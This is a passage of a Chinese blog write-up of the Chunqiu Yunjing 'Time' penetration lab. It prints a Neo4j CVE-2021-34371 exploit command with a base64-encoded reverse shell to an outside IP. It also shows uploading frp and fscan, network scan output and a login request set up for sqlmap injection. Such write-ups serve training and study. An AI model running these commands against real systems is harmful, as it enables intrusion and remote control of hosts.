@@ -1,0 +1,1880 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>春秋云镜-Time - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='ADCS, 滥用SID, ASREProast'>
+  <meta itemprop="name" content="春秋云镜-Time">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2025-05-07T19:17:46+08:00">
+  <meta itemprop="dateModified" content="2025-05-07T19:17:46+08:00">
+  <meta itemprop="wordCount" content="5578">
+  <meta itemprop="image" content="https://nlrvana.github.io/avatar.png">
+  <meta itemprop="keywords" content="ADCS,滥用SID,ASREProast"><meta property="og:url" content="https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="春秋云镜-Time">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-07T19:17:46+08:00">
+    <meta property="article:modified_time" content="2025-05-07T19:17:46+08:00">
+    <meta property="article:tag" content="ADCS">
+    <meta property="article:tag" content="滥用SID">
+    <meta property="article:tag" content="ASREProast">
+    <meta property="og:image" content="https://nlrvana.github.io/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://nlrvana.github.io/avatar.png">
+  <meta name="twitter:title" content="春秋云镜-Time">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time/" title="春秋云镜-Time - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/" title="春秋云镜-Certify" /><link rel="next" type="text/html" href="https://nlrvana.github.io/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" title="委派攻击" /><link rel="alternate" type="text/markdown" href="https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time/index.md" title="春秋云镜-Time - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "春秋云镜-Time",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/nlrvana.github.io\/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time\/"
+    },"genre": "posts","keywords": "ADCS, 滥用SID, ASREProast","wordcount":  5578 ,
+    "url": "https:\/\/nlrvana.github.io\/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time\/","datePublished": "2025-05-07T19:17:46+08:00","dateModified": "2025-05-07T19:17:46+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">春秋云镜-Time</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>春秋云镜-Time</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category" title="Category - 内网渗透"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 内网渗透</a></span></div><div class="post-meta-line"><span title="published on 2025-05-07 19:17:46"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-05-07">2025-05-07</time></span>&nbsp;<span title="5578 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 5600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>12 minutes</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="春秋云镜-Time"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;views
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#flag01">flag01</a></li>
+    <li><a href="#flag02">flag02</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="flag01" class="heading-element"><span>flag01</span>
+  <a href="#flag01" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>存在<code>neo4j nday</code>直接用工具打<br>
+<a href="https://github.com/zwjjustdoit/CVE-2021-34371.jar"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/zwjjustdoit/CVE-2021-34371.jar</a><br>
+<code>java -jar rhino_gadget.jar rmi://39.98.112.221:1337 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNy43MS4xNzEvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}&quot;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo4j@ubuntu:~$ cat flag01.txt  
+</span></span><span class="line"><span class="cl">cat flag01.txt  
+</span></span><span class="line"><span class="cl"> ██████████ ██                      
+</span></span><span class="line"><span class="cl">░░░░░██░░░ ░░                       
+</span></span><span class="line"><span class="cl">    ░██     ██ ██████████   █████   
+</span></span><span class="line"><span class="cl">    ░██    ░██░░██░░██░░██ ██░░░██  
+</span></span><span class="line"><span class="cl">    ░██    ░██ ░██ ░██ ░██░███████  
+</span></span><span class="line"><span class="cl">    ░██    ░██ ░██ ░██ ░██░██░░░░   
+</span></span><span class="line"><span class="cl">    ░██    ░██ ███ ░██ ░██░░██████  
+</span></span><span class="line"><span class="cl">    ░░     ░░ ░░░  ░░  ░░  ░░░░░░   
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">flag01: flag<span class="o">{</span>5f679591-a4e7-413e-9916-2986201ee5d0<span class="o">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">Do you know the authentication process of Kerberos?   
+</span></span><span class="line"><span class="cl">......This will be the key to your progress.  </span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="flag02" class="heading-element"><span>flag02</span>
+  <a href="#flag02" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>上传<code>frp</code>和<code>fscan</code>，<br>
+<code>nohup ./frpc -c frpc.ini &gt;/dev/null 2&gt;&amp;1 &amp;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo4j@ubuntu:~$ ifconfig  
+</span></span><span class="line"><span class="cl">ifconfig  
+</span></span><span class="line"><span class="cl">eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>  
+</span></span><span class="line"><span class="cl">        inet 172.22.6.36  netmask 255.255.0.0  broadcast 172.22.255.255  
+</span></span><span class="line"><span class="cl">        inet6 fe80::216:3eff:fe0b:3a1e  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;  
+</span></span><span class="line"><span class="cl">        ether 00:16:3e:0b:3a:1e  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Ethernet<span class="o">)</span>  
+</span></span><span class="line"><span class="cl">        RX packets <span class="m">109809</span>  bytes <span class="m">157017366</span> <span class="o">(</span>157.0 MB<span class="o">)</span>  
+</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>  
+</span></span><span class="line"><span class="cl">        TX packets <span class="m">23581</span>  bytes <span class="m">2535841</span> <span class="o">(</span>2.5 MB<span class="o">)</span>  
+</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="m">65536</span>  
+</span></span><span class="line"><span class="cl">        inet 127.0.0.1  netmask 255.0.0.0  
+</span></span><span class="line"><span class="cl">        inet6 ::1  prefixlen <span class="m">128</span>  scopeid 0x10&lt;host&gt;  
+</span></span><span class="line"><span class="cl">        loop  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Local Loopback<span class="o">)</span>  
+</span></span><span class="line"><span class="cl">        RX packets <span class="m">814</span>  bytes <span class="m">69341</span> <span class="o">(</span>69.3 KB<span class="o">)</span>  
+</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>  
+</span></span><span class="line"><span class="cl">        TX packets <span class="m">814</span>  bytes <span class="m">69341</span> <span class="o">(</span>69.3 KB<span class="o">)</span>  
+</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>fscan</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo4j@ubuntu:~$ ./fscan -h 172.22.6.36/24  
+</span></span><span class="line"><span class="cl">./fscan -h 172.22.6.36/24  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">   ___                              _      
+</span></span><span class="line"><span class="cl">  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __   
+</span></span><span class="line"><span class="cl"> / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /  
+</span></span><span class="line"><span class="cl">/ /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;      
+</span></span><span class="line"><span class="cl"><span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>    
+</span></span><span class="line"><span class="cl">                     fscan version: 1.8.3  
+</span></span><span class="line"><span class="cl">start infoscan  
+</span></span><span class="line"><span class="cl">trying RunIcmp2  
+</span></span><span class="line"><span class="cl">The current user permissions unable to send icmp packets  
+</span></span><span class="line"><span class="cl">start ping  
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.6.36     is alive  
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.6.12     is alive  
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.6.25     is alive  
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.6.38     is alive  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Icmp alive hosts len is: <span class="m">4</span>  
+</span></span><span class="line"><span class="cl">172.22.6.25:445 open  
+</span></span><span class="line"><span class="cl">172.22.6.12:445 open  
+</span></span><span class="line"><span class="cl">172.22.6.12:139 open  
+</span></span><span class="line"><span class="cl">172.22.6.25:139 open  
+</span></span><span class="line"><span class="cl">172.22.6.25:135 open  
+</span></span><span class="line"><span class="cl">172.22.6.12:135 open  
+</span></span><span class="line"><span class="cl">172.22.6.38:80 open  
+</span></span><span class="line"><span class="cl">172.22.6.38:22 open  
+</span></span><span class="line"><span class="cl">172.22.6.36:22 open  
+</span></span><span class="line"><span class="cl">172.22.6.36:7687 open  
+</span></span><span class="line"><span class="cl">172.22.6.12:88 open  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> alive ports len is: <span class="m">11</span>  
+</span></span><span class="line"><span class="cl">start vulscan  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo   
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.6.25  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>WIN2019  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.6.25  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo   
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.6.12  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>DC-PROGAME  
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.6.12  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> OsInfo 172.22.6.12  <span class="o">(</span>Windows Server <span class="m">2016</span> Datacenter 14393<span class="o">)</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.6.25     XIAORANG<span class="se">\W</span>IN2019                
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.6.12     <span class="o">[</span>+<span class="o">]</span> DC:DC-PROGAME.xiaorang.lab       Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.6.38        code:200 len:1531   title:后台登录  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle https://172.22.6.36:7687  code:400 len:50     title:None  
+</span></span><span class="line"><span class="cl">已完成 11/11  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 扫描结束,耗时: 13.497837664s  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>先访问<code>web</code>服务，在登陆点存在<code>sql</code>注入，直接用<code>sqlmap</code>跑</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /index.php HTTP/1.1  
+</span></span><span class="line"><span class="cl">Host: 172.22.6.38  
+</span></span><span class="line"><span class="cl">Content-Length: 26  
+</span></span><span class="line"><span class="cl">Cache-Control: max-age=0  
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1  
+</span></span><span class="line"><span class="cl">Origin: http://172.22.6.38  
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded  
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36  
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
+</span></span><span class="line"><span class="cl">Referer: http://172.22.6.38/  
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br  
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9  
+</span></span><span class="line"><span class="cl">Connection: close  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">username=*&amp;password=1  </span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
